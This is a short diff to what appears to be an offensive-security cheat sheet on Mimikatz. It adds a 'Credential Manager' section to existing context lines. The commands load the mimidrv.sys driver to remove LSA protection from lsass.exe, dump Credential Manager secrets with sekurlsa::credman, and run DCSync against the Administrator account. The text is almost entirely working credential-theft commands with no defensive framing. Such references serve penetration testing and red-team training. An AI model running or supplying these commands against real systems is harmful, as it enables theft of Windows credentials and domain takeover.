@@ -128,3 +128,14 @@ Visit [[Active-Directory-Persistence]] for details.
 !+ # LSA protection bypass!
 lsadump::dcsync /user:Administrator
 ```
+
+## Credential Manager
+
+```powershell
+privilege::debug
+# ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+# Means LSA protection:
+!+ # mimidrv.sys driver disables LSA protection.
+!processprotect /process:lsass.exe /remove
+sekurlsa::credman
+```
